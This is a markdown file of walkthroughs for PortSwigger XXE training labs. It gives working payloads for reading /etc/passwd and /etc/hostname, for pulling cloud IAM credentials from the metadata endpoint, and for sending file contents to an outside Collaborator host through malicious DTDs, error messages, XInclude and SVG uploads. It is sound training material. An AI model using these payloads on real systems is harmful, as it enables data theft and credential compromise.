<!-- omit in toc -->
# XXE

<!-- omit in toc -->
## Table of Contents

- [Exploiting XXE using external entities to retrieve files](#exploiting-xxe-using-external-entities-to-retrieve-files)
- [Exploiting XXE to perform SSRF attacks](#exploiting-xxe-to-perform-ssrf-attacks)
- [Blind XXE with out-of-band interaction](#blind-xxe-with-out-of-band-interaction)
- [Blind XXE with out-of-band interaction via XML parameter entities](#blind-xxe-with-out-of-band-interaction-via-xml-parameter-entities)
- [Exploiting blind XXE to exfiltrate data using a malicious external DTD](#exploiting-blind-xxe-to-exfiltrate-data-using-a-malicious-external-dtd)
- [Exploiting blind XXE to retrieve data via error messages](#exploiting-blind-xxe-to-retrieve-data-via-error-messages)
- [Exploiting XInclude to retrieve files](#exploiting-xinclude-to-retrieve-files)
- [Exploiting XXE via image file upload](#exploiting-xxe-via-image-file-upload)

## Exploiting XXE using external entities to retrieve files
Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
```
3. Replace the ``productId`` number with a reference to the external entity: ``&xxe;``. The response should contain "Invalid product ID:" followed by the contents of the ``/etc/passwd`` file.

## Exploiting XXE to perform SSRF attacks
Reference: https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

<!-- omit in toc -->
### Solution 
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://169.254.169.254/"> ]>
```
3. Replace the ``productId`` number with a reference to the external entity: ``&xxe;``. The response should contain "Invalid product ID:" followed by the response from the metadata endpoint, which will initially be a folder name.
4. Iteratively update the URL in the DTD to explore the API until you reach ``/latest/meta-data/iam/security-credentials/admin``. This should return JSON containing the ``SecretAccessKey``.

## Blind XXE with out-of-band interaction
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> ]>
```
5. Replace the ``productId`` number with a reference to the external entity:
```
&xxe;
```
6. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Blind XXE with out-of-band interaction via XML parameter entities
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock" and intercept the resulting POST request in Burp Suite Professional.
2. Go to the Burp menu, and launch the Burp Collaborator client.
3. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
4. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element, but insert your Burp Collaborator subdomain where indicated:
```
<!DOCTYPE stockCheck [<!ENTITY % xxe SYSTEM "http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net"> %xxe; ]>
```
5. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload.

## Exploiting blind XXE to exfiltrate data using a malicious external DTD
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration

<!-- omit in toc -->
### Quick Solution
In this lab a **malicious** DTD must be crafted and hosted on the exploit server and the **check stock** request must be tampered by adding a XML parameter entity. Payload in the next paragraph.

<!-- omit in toc -->
### Solution
1. Using Burp Suite Professional, go to the Burp menu, and launch the Burp Collaborator client.
2. Click "Copy to clipboard" to copy a unique Burp Collaborator payload to your clipboard. Leave the Burp Collaborator client window open.
3. Place the Burp Collaborator payload into a malicious DTD file:
```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://YOUR-SUBDOMAIN-HERE.burpcollaborator.net/?x=%file;'>">
%eval;
%exfil;
```
4. Click "Go to exploit server" and save the malicious DTD file on your server. Click "View exploit" and take a note of the URL.
5. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
6. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
7. Go back to the Burp Collaborator client window, and click "Poll now". If you don't see any interactions listed, wait a few seconds and try again.
8. You should see some DNS and HTTP interactions that were initiated by the application as the result of your payload. The HTTP interaction could contain the contents of the ``/etc/hostname`` file.

## Exploiting blind XXE to retrieve data via error messages
Reference: https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages

<!-- omit in toc -->
### Solution
1. Click "Go to exploit server" and save the following malicious DTD file on your server:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'file:///invalid/%file;'>">
%eval;
%exfil;
```
When imported, this page will read the contents of ``/etc/passwd`` into the ``file`` entity, and then try to use that entity in a file path.
1. Click "View exploit" and take a note of the URL for your malicious DTD.
2. You need to exploit the stock checker feature by adding a parameter entity referring to the malicious DTD. First, visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
3. Insert the following external entity definition in between the XML declaration and the ``stockCheck`` element:
```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
```
You should see an error message containing the contents of the ``/etc/passwd`` file.

## Exploiting XInclude to retrieve files
Reference: https://portswigger.net/web-security/xxe/lab-xinclude-attack

<!-- omit in toc -->
### Solution
1. Visit a product page, click "Check stock", and intercept the resulting POST request in Burp Suite.
2. Set the value of the ``productId`` parameter to:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## Exploiting XXE via image file upload
Reference: https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload

<!-- omit in toc -->
### Solution 
1. Create a local SVG image with the following content:
```xml
<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
        <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>
```
2. Post a comment on a blog post, and upload this image as an avatar.
3. When you view your comment, you should see the contents of the ``/etc/hostname`` file in your image. Use the "Submit solution" button to submit the value of the server hostname.